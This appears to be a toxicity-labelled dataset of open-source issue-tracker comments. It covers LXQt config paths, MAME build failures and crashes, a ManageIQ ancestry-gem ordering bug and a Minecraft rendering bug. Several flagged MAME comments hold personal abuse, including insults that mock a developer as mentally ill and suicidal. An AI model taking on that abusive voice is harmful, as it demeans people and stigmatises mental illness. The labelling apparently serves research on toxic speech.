lxqt/lxqt/1628/441442087,"meh - in the end it is dead simple - we provide things - distribution maintainers have to decide how to use it. These things should be not up to the user, a user should get a working system. That what distributions are for. Saying so every user who build his own packages act as his own maintainer or distributor. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441442638,Qt has  and it knows the hierarchy once env is set. Implementing another logic would be wrong because it would create unnecessary complications. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441442731,"But you know that XDG say should - it is not written in stone. so you can stop complaining here. Please. In the gentoo case - gentoo set it ""right"". We respect the setting and don't override it - so if you like it that way, go the extra mile and just copy the damn configurations into the place you want to have them as distribution. That is what was announced. /etc/xdg is free for distributions to use with no patching. We can discuss this forever and don't reach consensus. The only thing is - we can override things like the preset path (with a configuration switch) or the installation path (also with a configurations switch) ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441442766,"Ok, let's take it this way if you insist. I built software, I started it and I got blank desktop with blank panels. A few points  previous versions started fine. where is documentation which says that I have to add  to $XDG_CONFIG_DIRS or copy configs from  to  to actually make it work? And no, my expectations for software are probably higher than yours because I don't consider that blank desktop working. At least it is a serious downgrade of user experience compared to previous versions. if config is needed at  instead of , why is it installed in wrong directory?  ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443208,If you don't follow standard please don't point to it saying it's a downstream issue. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443284,"On last thing - all maintainers and users should at least read and understand the release notes, it might be that something ring some bells.  in case a distribution don't use /usr/share - copy, link or provide own settings ino /etc/xdg - that was excactly the reason for moving things out of the way. @friend one last question Do you act as maintainer or user here - in case you are a distribution maintainer it might be that it isn't the right job for you - in case you are a user - discuss this issue with your distribution maintainers - you know, that are these guys who write the official ebuilds. ",False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443115,It seems I wasn't the only one who didn't read comments carefully... Agreed. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443429,I've read about option for maintainers to override default configs from  with distribution-specific ones from . The point I tried to make is that those default configs are ignored. And that makes it look like it's just installed into wrong location. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443761,That's exactly what this issue is about. Title . And nowhere it says that user has to take additional actions to make it actually work. And is this actually reflected somewhere in documentation? Because there are no distributions which actually add  to $XDG_CONFIG_DIRS. At least no one could point to one yet. ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441443929,@friend time to give up - i think sometime we have to high expectations ,False,True,False,lxqt/lxqt/1628
lxqt/lxqt/1628/441444196,@friend The discussion became futile. Please close this! ,False,True,False,lxqt/lxqt/1628
mame/mamedev/4469/395810691,"Debian 9.6 x64 latest git sfiiii and sfiii2 show a CD-Rom error screen, sfiii3 stuck in a infinite CD-Rom loading screen.   This are the only ones I have to test. ",False,True,False,mame/mamedev/4469
mame/mamedev/4469/451354667,"""Latest git"" means nothing - you must supply a revision hash if you're not testing a tagged release.  Also this is a duplicate off #4468. ",False,True,False,mame/mamedev/4469
lxqt/lxqt/1628/441444217,Agreed. ,False,True,False,lxqt/lxqt/1628
main/CS2113-AY1819S1-T09-2/94/376844349,Describe the bug Duplicate command exception is produced even though the task with a different date is added. To Reproduce Steps to reproduce the behavior  Type TDL_add t/Milestone 3 m/CS2113 d/01-02 p/1 into command line. See error that task is already added  Expected behavior The User Guide did not specify which tasks are considered duplicate. So tasks with similar titles should be allowed on different days. Screenshots  &lt;hr&gt;  Reported by @friend Severity &lt;sub&gt;[original nusCS2113-AY1819S1/pe-1#71]&lt;/sub&gt; ,False,True,False,main/CS2113-AY1819S1-T09-2/94
mame/mamedev/4469/451357853,"Does it make sense to make a report about a version from one year ago? From last weak, from yesterday? NO! Even if I use such old version people will tell to use the latest, if this is not obvious to you it's because you are so damn stupid to figure it out by yourself. Don't be such a dick @friend because the post was already tagged duplicate and closed by me. ",True,True,False,mame/mamedev/4469
mame/mamedev/4789/479040679,"That is a superficial analysis because the stack it is also pointing out to 14 stacks inside MAME code. Since it's a segmentation fault and MAME it's crashing, we all know that 'something' it's trying to do an illegal read or write inside MAME memory space, otherwise it would be just bgfx's that isn't the case here, so it doesn't justify closing a legit bug report, just because. The regression comes from your commit 0bd02131b644b61088789f52f31b750c9aecaa6d before that MAME don't crash, I've just tested out. It's your commit, you implemented, so you go and you file an issue with the BGFX project. ",False,True,False,mame/mamedev/4789
mame/mamedev/4469/451425519,Do not engage in abusive language towards team members or you will find your access to the project curtailed. ,False,True,False,mame/mamedev/4469
mame/mamedev/4801/478404972,This is not necessary on Fedora - the library headers are found correctly.  Use  or figure out why the mingw paths aren't being used by default. ,False,True,False,mame/mamedev/4801
mame/mamedev/4789/478990169,"Looks like this is also happening with Linux, one other thing that I've noticed, it only happens if MAME it's compiled with Clang, with GCC there's no segmentation fault. ",False,True,False,mame/mamedev/4789
mame/mamedev/4789/479068785,"I do not use Linux and am not inclined to fix this, particularly with your ever-abusive attitude towards people who actually contribute to this project. ",False,True,False,mame/mamedev/4789
mame/mamedev/4789/479448922,"0bd02131b644b61088789f52f31b750c9aecaa6d is an update to bgfx from upstream.  If it started happening after that commit, it's a regression in bgfx itself.  MAME isn't doing anything different.  I also can't reproduce this with MAME 0.208 built with clang 6 and libc++ on Fedora 28.  There must be some other contributing factor. @friend you really need to work on your attitude.  Your comment is abrasive, and your conclusion doesn't match your findings. ",False,True,False,mame/mamedev/4789
mame/mamedev/4801/478473098,"I didn't file a bug for Fedora, people are aware that Fedora it's a unstable system and it is a test bed for RHEL. Anyway, this is not about Fedora. The way the build scripts are made it should be smart enough to detect what it needs from the system by it self without the need for  since there are tools available to use and depending on the system  should return the proper paths for libs and includes. The reason MAME fail to build it's because the build scripts uses a nasty hack like this one that replaces  with nothingsdl2-config --cflags | sed 'sSDL2' The correct path for SDL2 headers is Same happens on Linux, the build script uses  instead of  and it will obviously fail to compile either on Linux or mingw. The second reason why this is failing it's because there are no proper conditionals for , if we take example from  We can see  getting the SDL2 path hack, now if we look in to  This is basically it, we can't see any SDL2 configuration on either  or  for  and still don't understand why it passes  to the compiler since this is defined for . I didn't test at the time for lack of time, the regression is this 8ffff5d2d3bcebbdbefec2508ddd2ecd264a399a, removing  and  from the makefile and building with  for some kind of miracle this make it work again. And when I say ""miracle"" it's because there is nothing on the script passing the correct path for the compiler but still it compiles all the way through because even set as  it uses the bundled SDL2 from MAME when it should use the system. Do you concur? ",False,True,False,mame/mamedev/4801
mame/mamedev/4801/479455316,"Fedora is ""unstable"" in the sense that it's updated relatively quickly and packaged software occasionally gets a major version upgrade before a distribution update.  It isn't ""unstable"" in the sense of crashing or not working.  Being the ""testbed for RHEL"" is exactly why a lot of people use it.  It uses the same packaging system, similar network and service configuration, it's largely ABI-compatible (e.g. it uses the same versioning for FIPS-compliant OpenSSL), and it gives you a preview of where RHEL/CentOS may be going.  The benefits are huge for people who, like me, use RHEL for deployment of line-of-business applications. You're misunderstanding why it does special stuff for macOS - on macOS a system installation of SDL2 uses a NeXT-style framework, which is not used for any other target. Before 8ffff5d2d3bcebbdbefec2508ddd2ecd264a399a  and  did the same thing.  The option wasn't working intuitively.  It's not a regression that  now disables the option instead of doing the same thing as . Stripping  from the end of the include path is intentional.  For consistency between macOS and other platforms, MAME includes the  prefix when including SDL2 headers.  Hence, the parent directory is what we need to add to the include path. Your analysis is completely flawed, and the issue you're reporting is not happening for others. ",False,True,False,mame/mamedev/4801
mame/mamedev/4469/451429161,"@friend ""latest"" is a different thing every time someone commits.  In the time between when you compile, when you open the issue, and when someone reads it, ""latest"" will have changed.  You've been around long enough to understand this.  Without a revision hash, we don't know what ""latest"" is.  Note that on #4468 an abbreviated revision hash is included in the issue description.  You're being banned from MAMEdev repositories for one week for counter-productive behaviour. ",False,True,False,mame/mamedev/4469
mame/mamedev/4801/479505881,"This is not the real reason your are giving a ban, it's to hide your own incompetence again, and again and we can go on and on, how many times you are gonna close legit reports to dealt with it later? This is what happens when you give a nobody like you some power, they like to show off and oppress other people, to shut people off, you are disgusting and a coward. What you are gonna do now? Delete messages like you did before? It doesn't matter the lame excuse you've gave, it doesn't change the fact that the script it's passing the wrong path to the compiler and #4789 it's breaking MAME memory space . And don't get me wrong, I know how to use a issue tracker, in an organize project, the issue it's acknowledge, tagged and dealt with latter. If you or any other dev will handle it now, tomorrow or 10 years from now, I don't care. It's a damn bug report and not a help request. Why all the drama about it, what are you afraid of? Respect it's a thing we earn, you give respect you shall receive it, if you come towards me in a disrespectful manner I'll shake you off my way and I don't care if you are a fruit cake or a snow flake or whatever generation name you people call yourself this days. Don't expect me to respect a sick, mental ill and suicidal person like @friend that like to attack and persecute people for unknown reason.  is the kind of person you give authority to and allow him to take on other people. ",True,True,False,mame/mamedev/4801
manageiq/ManageIQ/1210/114590930,@friend @friend What is the status of this PR? ,False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/102503009,yeah I'm going to have to add local code to workaround this issue...maybe I can do something general in RelationshipMixin / Relationship ,False,True,False,manageiq/ManageIQ/1210
mame/mamedev/4801/424476807,"Debian 9.6 X64 GCC 6.3.0 Build options  Latest commit tested 842aa09 sdl2-config --libs -L/usr/lib/x86_64-linux-gnu -lSDL2 sdl2-config --cflags -I/usr/include/SDL2 -D_REENTRANT Compiling src/osd/modules/input/input_common.cpp... ../../../../../src/osd/modules/input/input_common.cpp3622 fatal error SDL2/SDL.h No such file or directory include &lt;SDL2/SDL.h&gt;                   ^  compilation terminated. osd_sdl.make921 recipe for target '../../../../mingw-gcc/obj/x64/Release/osd_sdl/src/osd/modules/input/input_common.o' failed make[2]  [../../../../mingw-gcc/obj/x64/Release/osd_sdl/src/osd/modules/input/input_common.o] Error 1 Makefile19 recipe for target 'osd_sdl' failed make[1]  [osd_sdl] Error 2 makefile1057 recipe for target 'windows_x64' failed make *** [windows_x64] Error 2 make VERBOSE=1 Compiling src/osd/modules/input/input_common.cpp... /usr/x86_64-w64-mingw32/bin/x86_64-w64-mingw32-g++    -MMD -MP -MP -DX64_WINDOWS_ABI -DPTR64=1 -DNDEBUG -DCRLF=3 -DLSB_FIRST -DFLACNO_DLL -DPUGIXML_HEADER_ONLY -DNATIVE_DRC=drcbe_x64 -DLUA_COMPAT_ALL -DLUA_COMPAT_5_1 -DLUA_COMPAT_5_2 -DWIN32 -DUSE_NETWORK -DOSD_NET_USE_PCAP -DSDLMAME_NO_X11 -DUSE_XINPUT=0 -DSDLMAME_SDL2=1 -DOSD_SDL -DUNICODE -D_UNICODE -D_WIN32_WINNT=0x0501 -DWIN32_LEAN_AND_MEAN -DNOMINMAX -DUSE_OPENGL=1 -DSTDC_LIMIT_MACROS -DSTDC_FORMAT_MACROS -DSTDC_CONSTANT_MACROS -DIMGUI_DISABLE_OBSOLETE_FUNCTIONS -DUSE_QTDEBUG=0 -I""../../../../../3rdparty/asio/include"" -I""../../../../../3rdparty/winpcap/Include"" -I""../../../../../3rdparty/compat/mingw"" -I""../../../../../3rdparty/portaudio/include"" -I""../../../../../3rdparty/compat/winsdk-override"" -I""../../../../../3rdparty/bgfx/examples/common"" -I""../../../../../3rdparty/bgfx/include"" -I""../../../../../3rdparty/bgfx/3rdparty"" -I""../../../../../3rdparty/bx/include"" -I""../../../../../3rdparty/rapidjson/include"" -I""../../../../../3rdparty/portmidi/pm_common"" -I""../../../../../src/emu"" -I""../../../../../src/devices"" -I""../../../../../src/osd"" -I""../../../../../src/lib"" -I""../../../../../src/lib/util"" -I""../../../../../src/osd/modules/file"" -I""../../../../../src/osd/modules/render"" -I""../../../../../3rdparty"" -I""../../../../../src/osd/sdl""   -g -m64 -pipe -g1 -fno-omit-frame-pointer -fno-optimize-sibling-calls -O3 -fno-strict-aliasing -march=""bdver1"" -mfpmath=sse -Wno-unknown-pragmas -Wall -Wcast-align -Wundef -Wformat-security -Wwrite-strings -Wno-sign-compare -Wno-conversion -Wno-error=deprecated-declarations -Wno-unused-result -Wno-array-bounds -m64 -x c++ -std=c+plus one4 -Woverloaded-virtual -include /home/mame/build/mame/src/osd/sdl/sdlprefix.h -o ""../../../../mingw-gcc/obj/x64/Release/osd_sdl/src/osd/modules/input/input_common.o"" -c ""../../../../../src/osd/modules/input/input_common.cpp"" ../../../../../src/osd/modules/input/input_common.cpp3622 fatal error SDL2/SDL.h No such file or directory include &lt;SDL2/SDL.h&gt;                   ^  compilation terminated. osd_sdl.make921 recipe for target '../../../../mingw-gcc/obj/x64/Release/osd_sdl/src/osd/modules/input/input_common.o' failed make[2]  [../../../../mingw-gcc/obj/x64/Release/osd_sdl/src/osd/modules/input/input_common.o] Error 1 Makefile19 recipe for target 'osd_sdl' failed make[1]  [osd_sdl] Error 2 make[1] Leaving directory '/home/mame/build/mame/build/projects/sdl/mametiny/gmake-mingw64-gcc' makefile1057 recipe for target 'windows_x64' failed make *** [windows_x64] Error 2 ♠ ",False,True,False,mame/mamedev/4801
mame/mamedev/4801/479455833,"@friend between this and #4789 you've shown that you don't seem to have learned anything about how now to use the issue tracker, and how not to get developers off-side.  You're getting a 6-week ban for this. ",True,True,False,mame/mamedev/4801
mame/mamedev/4801/479510105,"I'll report you too @friend, for all the internet to see how disgusting and abusive you are.♠#mamegate` ",True,True,False,mame/mamedev/4801
manageiq/ManageIQ/1210/102045896,Related #2481 ,False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/51598443,"vc_refresh_spec has been sporadically failing with Attached is code that will recreate it eventually, it seems as though sometimes the default resource pool is not the ""first"" resource pool. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/115822511,&lt;pr_mergeability_checker /&gt;This pull request is not mergeable.  Please rebase and repush. ,False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/120451494,@friend I say we close this and fix it in ancestry or monkey patch it. ,False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67417747,"@friend yay, I guess. ",False,True,False,manageiq/ManageIQ/1210
mame/mamedev/4789/423565389,"Windows 10 x64 1803 (17134.590) Clang 7.0.1 Python 2.7.16 Build options MAME crash with  The folder  it's up to date. Thread 1 received signal SIGSEGV, Segmentation fault. 0x0000000000bd9153 in submit () at ../../../../../3rdparty/bgfx/src\bgfx.cpp1216 1216                    m_frame-&gt;m_renderItem[renderItemIdx].draw = m_draw; (gdb) where 0  0x0000000000bd9153 in submit () at ../../../../../3rdparty/bgfx/src\bgfx.cpp1216 1  0x0000000000be28b3 in submit () at ../../../../../3rdparty/bgfx/src\bgfx.cpp3530 2  submit () at ../../../../../3rdparty/bgfx/src\bgfx.cpp4708 3  submit () at ../../../../../3rdparty/bgfx/src\bgfx.cpp4702 4  0x00000000004a3ab2 in submit () at ../../../../../src/osd/modules/render/bgfx\effect.cpp49 5  0x0000000000488fa9 in draw () at ../../../../../src/osd/modules/render\drawbgfx.cpp863 6  0x000000000046d495 in draw_video_contents () at ../../../../../src/osd/windows\window.cpp1395 7  0x000000000046cb8d in video_window_proc () at ../../../../../src/osd/windows\window.cpp1318 8  0x000000000046e07f in winwindow_video_window_proc_ui(HWND__*, unsigned int, unsigned long long, long long) () at ../../../../../src/osd/windows\winmenu.cpp23  9  0x00007ffd65886d41 in USER32!CallWindowProcW () from C\Windows\System32\user32.dll 10 0x00007ffd6588690b in USER32!CallWindowProcW () from C\Windows\System32\user32.dll 11 0x00007ffd3d37478f in DllUnregisterServer () from C\Windows\SYSTEM32\dinput8.dll 12 0x00007ffd3d3748d4 in DllUnregisterServer () from C\Windows\SYSTEM32\dinput8.dll 13 0x00007ffd3d37478f in DllUnregisterServer () from C\Windows\SYSTEM32\dinput8.dll 14 0x00007ffd3d374b4a in DllUnregisterServer () from C\Windows\SYSTEM32\dinput8.dll 15 0x00007ffd65886d41 in USER32!CallWindowProcW () from C\Windows\System32\user32.dll 16 0x00007ffd6588634e in USER32!SendMessageW () from C\Windows\System32\user32.dll 17 0x00007ffd658860d8 in USER32!SendMessageW () from C\Windows\System32\user32.dll 18 0x00007e1100025ae7 in SetLoadLibraryCallback () from D\cmder_mini\vendor\conemu-maximus5\ConEmu\ConEmuHk64.dll 19 0x000000000046c473 in update () at ../../../../../src/osd/windows\window.cpp891 20 0x0000000000469e2f in update () at ../../../../../src/osd/windows\video.cpp94 21 0x00000000008b87a5 in frame_update () at ../../../../../src/emu\video.cpp251 22 0x00000000005106ad in set_startup_text () at ../../../../../src/frontend/mame/ui\ui.cpp382 23 0x00000000004de6d3 in create_ui () at ../../../../../src/frontend/mame\mame.cpp291 24 0x00000000008609e3 in start () at ../../../../../src/emu\machine.cpp208 25 0x0000000000861d4f in run () at ../../../../../src/emu\machine.cpp308 26 0x00000000004ddf9a in execute () at ../../../../../src/frontend/mame\mame.cpp239 27 0x000000000053999f in start_execution () at ../../../../../src/frontend/mame\clifront.cpp262 28 0x000000000053aae5 in execute () at ../../../../../src/frontend/mame\clifront.cpp278 29 0x00000000004deadf in emulator_infostart_frontend(emu_options&amp;, osd_interface&amp;, stdvector&lt;stdcxx11basic_string&lt;char, stdchar_traits&lt;char&gt;, stdallocator&lt;char&gt; &gt;, stdallocator&lt;stdcxx11basic_string&lt;char, stdchar_traits&lt;char&gt;, stdallocator&lt;char&gt; &gt; &gt; &gt;&amp;) () at ../../../../../src/frontend/mame\mame.cpp339 30 0x000000000045bd93 in main () at ../../../../../src/osd/windows\winmain.cpp323 ♠ ",False,True,False,mame/mamedev/4789
manageiq/ManageIQ/1210/66508237,"Wait, I think the PR tltle is backwards or maybe I'm misreading.  If the code it blowing up on  then that is testing .descendants, not .all_resource_pools. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/66506586,"Note, below that the same seed fails in different iterations of the test. ` ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/66507476,"Checked commit  with rubocop 0.27.1 1 file checked, 1 offense detected vmdb/spec/models/ems_refresh/refreshers/vc_refresher_spec.rb  [ ] Warn - Line 28, Col 1 - Lint/BlockAlignment -  at 28, 0 is not aligned with  at 14, 2  ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67519572,"@friend haha.... So a ""good"" run in our environment looks like the following.  Notice that for descendants the Default is always first which is the expectation. And here's a ""bad"" run.  Notice that the Default is not first.  I even noticed that in the ""good"" run, all_resource_pools_with_default did not have the Default first which I would have expected, but isn't technically required there. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67412097,@friend I got this to repeat locally.  Trying to understand what's going on. ,False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67523186,"Cool @friend, I'm glad you confirmed what I found.  My concern is that it's not a test bug but a relationship sporadic bug. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67552400,"I've narrowed this down to a bug in ancestry gem.  It's quite sinister, and not fixed on ancestry master.  The line in question is here  .  Notice the .  This should work, but the  call after it seems to completely remove the ordering generated by that. For our code, the SQL generated by that code is Notice the lack of ordering clause. If I put the  after the , the SQL becomes Also note that the ancestors method and the path method do the right thing, but the descendants method and the subtree method do the ""wrong"" thing. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67671476,"Opened an issue  may have to put in a (temporary?) code fix on our side, because I'm not sure it's easily solvable in upstream. ",False,True,False,manageiq/ManageIQ/1210
manageiq/ManageIQ/1210/67552553,"Ugh, actually, right after I sent that I realized that the ordering in question doesn't actually order the elements.  I guess  doesn't do what I expected. ",False,True,False,manageiq/ManageIQ/1210
mapbox-gl-js/mapbox/7158/352352721,Is there a existing plugin for clusters  I can use to ignore fucking styles and whole screen of circles? Leaflet Markercluster is useless!  ,True,True,False,mapbox-gl-js/mapbox/7158
mapbox-studio-classic/mapbox/1083/50716877,Seeing an OS X only test failure ( Logging here until I have time to investigate ,False,True,False,mapbox-studio-classic/mapbox/1083
mapserver/mapserver/3147/3961590,"Reporter jimk Date 2009/10/02 - 2049 Trac URL  I try to access a layer that points to a shape file with no attributes I get the following error... It looks like this is related to a change introduced with the improved algorithm in msLayerWhichItems() in maplayer.c. The problem seems to be how lines 385 and 386 are interacting with msDBFGetItems/msShapeFileLayerGetItems in that msShapeFileLayerGetItems is returning MS_FAILURE because msDBFGetItems found no items and thus calls msSetError and returns NULL. The line maplayer.c386 then causes msLayerWhichItems to fail before line 388 can say this is an expected condition. The following are the changes I made to mapshape.c (to return MS_SUCCESS) and to mapxbase.c to not set an error that isn't an error. The change to mapxbase.c may cause issues with tileindexed layers with no attributes in the tileindex shapefile failing without an error message. This depends on what the correct behavior is in another place in msTiledSHPLayerGetItems. I think this is for the tileindex not the actual data shapes, and the tileindex does require at least one attribute. If this is true and the mapxbase.c change is kept, an error probably needs to be set in msTiledSHPLayerGetItems if there are no items. ",False,True,False,mapserver/mapserver/3147
mapserver/mapserver/3147/4940791,Author jimk Date 2009/10/19 - 1950 Thanks. It looks like it was committed in 84a97cab1ed2a0a11e7a1e1d36f6813737a2878f (r9480). I tested against bc6ca1fddc89c27b7cf30939b6ce11d54b6f909f (r9494) and it is working. ,False,True,False,mapserver/mapserver/3147
mapserver/mapserver/3147/4940790,"Author sdlime Date 2009/10/19 - 1927 Jim I did add this to beta 4, but only the mapshape.c change. Please verify that your test base works if you would. Steve ",False,True,False,mapserver/mapserver/3147
mapserver/mapserver/3147/4972596,attachment   ,False,True,False,mapserver/mapserver/3147
matplotlib/matplotlib/14101/495963602,plus one And I even suspect that this got us a minor performance improvement! ,False,True,False,matplotlib/matplotlib/14101
material-design-lite/google/4634/238206802,Newer PR available. Closing. ,False,True,False,material-design-lite/google/4634
matplotlib/matplotlib/14101/438687195,"_ImageBase._make_image is a big, 267-line (+docstring) beast.  Shorten it by ~20% by factoring out a helper for _image.resample (that takes care of allocating the output array), and with various small cleanups. PR Summary PR Checklist  [ ] Has Pytest style unit tests [ ] Code is Flake 8 compliant [ ] New features are documented, with examples if plot related [ ] Documentation is sphinx and numpydoc compliant [ ] Added an entry to doc/users/next_whats_new/ if major new feature (follow instructions in README.rst there) [ ] Documented in doc/api/api_changes.rst if API changed in a backward-incompatible way  ",False,True,False,matplotlib/matplotlib/14101
minecraft-bugs/tryashtar/864/339511910,"&lt;img src="" width=20 height=20&gt; Cad'ika Orade • Oct 27, 2012 Not sure how valuable pictures of invisible things are, but I have uploaded screenshots. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511911,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Nov 3, 2012 Duplicate of [MC-61] ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511908,"&lt;img src="" width=20 height=20&gt; Tuukka Mannermaa • Oct 27, 2012 It seems like the mobs are affected by the new potion ''Invisibility potion''.. I have no idea. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511914,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Feb 9, 2013 Ok, Reopened. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511921,"&lt;img src="" width=20 height=20&gt; [Mod] CubeTheThird • Feb 10, 2013 I have also had this occur, but only when using optifine. Do you have any mods installed? ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511913,"&lt;img src="" width=20 height=20&gt; Cad'ika Orade • Feb 9, 2013 This issue is neither resolved nor a duplicate of MC-61. These mobs do not have invisibility potions on them. If you believe this to be a duplicate of MC-61, you did not read the description nor did you look at the many screenshots I have provided. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511906,"&lt;img src="" width=20 height=20&gt; Selbram (Tory Clement) • Oct 27, 2012 Please provides some screenshots for confirmation. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511929,"&lt;img src="" width=20 height=20&gt; [Mod] CubeTheThird • Feb 25, 2013 Can you specify all of your video settings? I cannot seem to reproduce this without optifine, though I can confirm that this only happens in Linux. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511923,"&lt;img src="" width=20 height=20&gt; [Mod] CubeTheThird • Feb 10, 2013 Can I also assume you are using fast, and not fancy, graphics? ",False,True,False,minecraft-bugs/tryashtar/864
material-design-lite/google/4634/169503700,"Hello lovely humans, babel-core just published its new version 6.13.0. &lt;table&gt;   &lt;tr&gt;     &lt;th align=left&gt;       State     &lt;/th&gt;     &lt;td&gt;       Update rocket     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Dependency     &lt;/td&gt;     &lt;td&gt;       babel-core     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       New version     &lt;/td&gt;     &lt;td&gt;       6.13.0     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Type     &lt;/td&gt;     &lt;td&gt;       devDependency     &lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;This version is not covered by your current version range. Without accepting this pull request your project will work just like it did before. There might be a bunch of new features, fixes and perf improvements that the maintainers worked on for you though. I recommend you look into these changes and try to get onto the latest version of babel-core. Given that you have a decent test suite, a passing build is a strong indicator that you can take advantage of these changes by merging the proposed change into your project. Otherwise this branch is a great starting point for you to work on the update. Do you have any ideas how I could improve these pull requests? Did I report anything you think isn’t right? Are you unsure about how things are supposed to work? There is a collection of frequently asked questions and while I’m just a bot, there is a group of people who are happy to teach me new things. Let them know. Good luck with your project sparkles You rock! palm_tree  This pull request was created by greenkeeper.io. &lt;sub&gt;Tired of seeing this sponsor message? zap &lt;/sub&gt; ",False,True,False,material-design-lite/google/4634
minecraft-bugs/tryashtar/864/339511931,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Mar 5, 2013 Please force a crash by pressing F3 + C for 10 seconds while ingame and attach the crash report here. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511926,"&lt;img src="" width=20 height=20&gt; Cad'ika Orade • Feb 10, 2013 That would be correct. Updated Environment accordingly. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511933,"&lt;img src="" width=20 height=20&gt; Tails • Mar 14, 2013 Incomplete. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511922,"&lt;img src="" width=20 height=20&gt; Cad'ika Orade • Feb 10, 2013 I do currently use Optifine, but the error is visible with and without Optifine. When I use Optifine, I also have trouble with entity textures being randomly replaced with terrain.png and random masses of polygons randomly filling whole chunks. That much is clearly Optifine's doing, and is why I hope Optifine will become obsolete after 1.5. I would update my graphics drivers to see if that fixes the issue, but Intel does not acknowledge this model of graphics adapter anymore. Also, the issue is only on Ubuntu Linux. I have tried updating LWJGL, to no effect. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/268590323,"Mojira Ticket MC-913 &lt;img src="" width=20 height=20&gt; Cad'ika Orade • Oct 27, 2012 Several entities seem to have rendering issues where some or all of the entity is rendered invisible. Specifically Spiders Legs and eyes are visible, but the body is transparent Zombies Completely invisible, a very serious issue! Squid Body and half of the tentacles are invisible Chickens Unsure. I haven't seen any in my 1.4.2 world, so they might be invisible. Chest Lid or body of chests and enderchests rendered invisible. Signs Sign rendered invisible, text remains. (Possibly only with Optifine, have not yet seen in Vanilla) I have not yet seen any Endermen, Cave Spiders, Blazes, Villagers, or Zombie Pigmen. I do not know if they are effected. (CORRECTION All mobs are effected) UPDATE After updating Java and LWJGL, the bug is not fixed but far more random. The previously effected mobs now have random parts missing. Attached screenshots. The burning effect you see is actually fully-invisible zombies burning in the sun. UPDATE 2 For reasons that I cannot fathom, either carelessness or system error, this has been marked as a duplicate of MC-61 and resolved. This is not the case. I never made any mention of invisibility potions, and this bug still exists as of 1.4.7. There is no point in this amazing bag tracking system if Mojang isn't even going to read the bug reports, and just classify them as resolved because they supposedly duplicate other, completely unrelated reports. Attachments &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt;  &lt;img src="" width=""240"" height=""135""&gt; crash-2014-08-08_16.04.01-client.txt ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511935,"&lt;img src="" width=20 height=20&gt; Carter Paul • Jul 16, 2013 I changed to the standard version of optifine and it fixed this exact problem on ubuntu version 13.04. I hope this helps. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511937,"&lt;img src="" width=20 height=20&gt; Starwarswii • Aug 8, 2014 I have also seen this happen with armor stands, either being completely invisible or rendering only the base at an odd angle (I believe this to be the entity's ""feet""). ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511941,"&lt;img src="" width=20 height=20&gt; Starwarswii • Aug 8, 2014 Updating my drivers and/or the d snapshot seemed to fix it for me. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511943,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Aug 8, 2014 (at)[~starwarswii] Can you please try out with 14w32a/b/c to see if that was your driver or the snapshot ? And please  force a crash by pressing F3 + C for 10 seconds while in-game and attach the crash report ({{[minecraft/crash-reports/crash-&lt;DATE&gt;-client.txt| here. ",False,True,False,minecraft-bugs/tryashtar/864
minecraft-bugs/tryashtar/864/339511945,"&lt;img src="" width=20 height=20&gt; Starwarswii • Aug 8, 2014 This is a forced-crash report after I entered my world in 14w32b (the version of minecraft I was having the visual bugs in). I updated my video card drivers before entering and the problem was fixed. ",False,True,False,minecraft-bugs/tryashtar/864
